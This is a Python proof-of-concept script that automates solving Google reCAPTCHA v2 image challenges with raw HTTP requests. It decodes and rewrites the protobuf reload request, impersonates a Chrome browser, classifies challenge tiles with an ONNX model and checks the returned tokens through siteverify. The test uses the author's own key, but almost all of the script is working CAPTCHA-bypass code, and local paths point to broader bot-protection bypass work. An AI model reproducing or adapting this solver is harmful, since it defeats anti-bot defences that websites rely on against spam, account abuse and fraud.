# Decisive test against YOUR OWN reCAPTCHA v2 key + an AUTHORITATIVE siteverify oracle.
# The demo key (6LfD3PIb…) is pathologically hard and origin-bound to 2captcha.com, and
# every prior test only had the md5(payload) proxy signal. With your own key you get:
#   (a) a possibly MUCH weaker image soft-block (default-security key), and
#   (b) POST /recaptcha/api/siteverify(secret,response) -> the ground-truth accept verdict.
#
# Fill own_key.json:  {"sitekey":"6Lc...","secret":"6Lc...","domain":"yourdomain.com"}
# Register a free v2 "I'm not a robot" key in Google admin console at DEFAULT security with
# "Verify the origin of reCAPTCHA solutions" turned OFF (so co spoofing is allowed).
import json, re, base64, hashlib, io, sys
import numpy as np
from PIL import Image
from curl_cffi import requests
import onnxruntime as ort

K = json.load(open(r"C:\Users\user\Desktop\a\recaptcha-re\poc\own_key.json"))
SITEKEY = K["sitekey"]; SECRET = K["secret"]; DOMAIN = K["domain"]
VER = "TnA7HacJFoBWt9hnlunBlYfK"
CO = base64.b64encode(f"https://{DOMAIN}:443".encode()).decode().rstrip("=")
CAP = json.load(open(r"C:\Users\user\Desktop\a\recaptcha-re\poc\capture.json"))
UA = CAP["items"][0]["headers"]["User-Agent"]
MODEL = r"C:\Users\user\Desktop\a\cf-bypass\cf-bypasss\models\recaptcha_cls_effv2s_128_single.onnx"
REF = f"https://www.google.com/recaptcha/api2/bframe?k={SITEKEY}"
md5 = lambda b: hashlib.md5(b).hexdigest()[:8]
dejson = lambda t: json.loads(re.sub(r"^\)\]\}'\n?", "", t))
CLS = "bicycle bridge bus car chimney crosswalk hydrant motorcycle mountain other palm stairs tractor traffic_light".split()
MID2I = {"/m/0199g":0,"/m/0c9ph5":1,"/m/01bjv":2,"/m/0k4j":3,"/m/06bt6":4,"/m/079cl":5,"/m/014xcs":5,"/m/01pns0":6,"/m/04_sv":7,"/m/09d_r":8,"/m/0cdl1":10,"/m/01lynh":11,"/m/013xlm":12,"/m/015qff":13}
HUM2I = {"bike":0,"bicycle":0,"bridge":1,"bus":2,"car":3,"taxi":3,"chimney":4,"pedestrian crossing":5,"crosswalk":5,"fire hydrant":6,"hydrant":6,"motorcycle":7,"mountain":8,"palm tree":10,"stairs":11,"tractor":12,"traffic light":13}
sess_ort = ort.InferenceSession(MODEL, providers=["CPUExecutionProvider"]); IN = sess_ort.get_inputs()[0].name

def rv(b,p):
    sh=r=0
    while True:
        x=b[p];p+=1;r|=(x&0x7f)<<sh
        if not(x&0x80):break
        sh+=7
    return r,p
def decode(b):
    o=[];p=0
    while p<len(b):
        t,p=rv(b,p);fn=t>>3;wt=t&7
        if wt==0:v,p=rv(b,p);o.append([fn,0,v])
        elif wt==2:ln,p=rv(b,p);o.append([fn,2,b[p:p+ln]]);p+=ln
        elif wt==5:o.append([fn,5,b[p:p+4]]);p+=4
        elif wt==1:o.append([fn,1,b[p:p+8]]);p+=8
        else:break
    return o
def ev(n):
    o=bytearray()
    while True:
        x=n&0x7f;n>>=7
        if n:o.append(x|0x80)
        else:o.append(x);break
    return bytes(o)
def encode(fs):
    o=bytearray()
    for fn,wt,val in fs:
        o+=ev((fn<<3)|wt)
        if wt==0:o+=ev(val)
        elif wt==2:o+=ev(len(val))+val
        else:o+=val
    return bytes(o)
def setf(fs,n,s):
    for f in fs:
        if f[0]==n:f[2]=s.encode("latin1")
    return fs
BASE=base64.b64decode(CAP["items"][0]["bodyB64"])

def classify(pil,ci):
    a=np.asarray(pil.convert("RGB").resize((128,128)),dtype=np.float32)/255.0
    a=np.transpose(a,(2,0,1))[None,...]
    return float(sess_ort.run(None,{IN:a})[0][0][ci])

def siteverify(token):
    r=requests.post("https://www.google.com/recaptcha/api/siteverify",
                    data={"secret":SECRET,"response":token},timeout=20)
    return r.json()

def run(s):
    au=f"https://www.google.com/recaptcha/api2/anchor?ar=1&k={SITEKEY}&co={CO}&hl=en&v={VER}&size=normal&cb=p"
    html=s.get(au,headers={"User-Agent":UA}).text
    m=re.search(r'id="recaptcha-token"[^>]*value="([^"]+)"',html)
    if not m:
        print("anchor: no token (key/domain mismatch?) — first 200:",re.sub(r"\s+"," ",html)[:200]); return
    c=m.group(1)
    f=decode(BASE); setf(f,2,c); setf(f,14,SITEKEY); setf(f,16,""); setf(f,6,"fi")
    arr=dejson(s.post(f"https://www.google.com/recaptcha/api2/reload?k={SITEKEY}",data=encode(f),
        headers={"User-Agent":UA,"Content-Type":"application/x-protobuffer","Referer":REF,"Origin":"https://www.google.com"}).text)
    typ=arr[5] if len(arr)>5 else None
    print("reload type:",typ,"| token slot:",(str(arr[1])[:24]+"…") if arr[1] else "null")
    # AUTO-PASS check: a trusted key may return a usable token at arr[1] with no challenge
    if not typ:
        v=siteverify(arr[1]); print("AUTO-PASS siteverify:",v)
        return v.get("success")
    ptok=arr[9]
    if typ=="dynamic":
        pm=arr[4][1]; ci=MID2I.get(pm[0],HUM2I.get(str(pm[6]).lower())); rows,cols=pm[2],pm[3]
    else:
        s0=arr[4][5][0][0]; ci=MID2I.get(s0[0]); rows,cols=s0[3],s0[4]
    print("target class:",CLS[ci] if ci is not None else "??",f"{rows}x{cols}")
    if ci is None: return
    c=arr[1];
    img=s.get(f"https://www.google.com/recaptcha/api2/payload?p={ptok}&k={SITEKEY}",headers={"User-Agent":UA,"Referer":REF}).content
    for rnd in range(10):
        pil=Image.open(io.BytesIO(img)); W,H=pil.size; cw,ch=W//cols,H//rows
        confs=[classify(pil.crop(((i%cols)*cw,(i//cols)*ch,(i%cols)*cw+cw,(i//cols)*ch+ch)),ci) for i in range(rows*cols)]
        sel=sorted([i for i,v in enumerate(confs) if v>0.55])
        print(f"  round {rnd}: img={md5(img)} sel={sel} max={max(confs):.2f}")
        if not sel: break
        ra=dejson(s.post(f"https://www.google.com/recaptcha/api2/replaceimage?k={SITEKEY}",
            data=f"v={VER}&c={c}&ds={json.dumps([sel],separators=(',',':'))}",
            headers={"User-Agent":UA,"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8","Referer":REF,"Origin":"https://www.google.com"}).text)
        c=ra[1]
        if len(ra)>5 and ra[5]:
            ni=s.get(f"https://www.google.com/recaptcha/api2/payload?p={ra[5]}&k={SITEKEY}",headers={"User-Agent":UA,"Referer":REF}).content
            if md5(ni)!=md5(img): print("   *** IMAGE ADVANCED ***")
            img=ni
        else: break
    uv=dejson(s.post(f"https://www.google.com/recaptcha/api2/userverify?k={SITEKEY}",
        data=f"v={VER}&c={c}",headers={"User-Agent":UA,"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8","Referer":REF,"Origin":"https://www.google.com"}).text)
    print("  userverify:",json.dumps(uv)[:80])
    tok=uv[1] if len(uv)>1 else None
    if tok:
        v=siteverify(tok); print("  *** siteverify:",v,"***")
        return v.get("success")
    print("  null token (no usable response)")
    return False

s=requests.Session(impersonate="chrome")
n=int(sys.argv[1]) if len(sys.argv)>1 else 5
for i in range(n):
    print(f"=== run {i+1} ===")
    if run(s): print("\n>>> ACCEPTED TOKEN — pure-request WORKS on this key <<<"); break
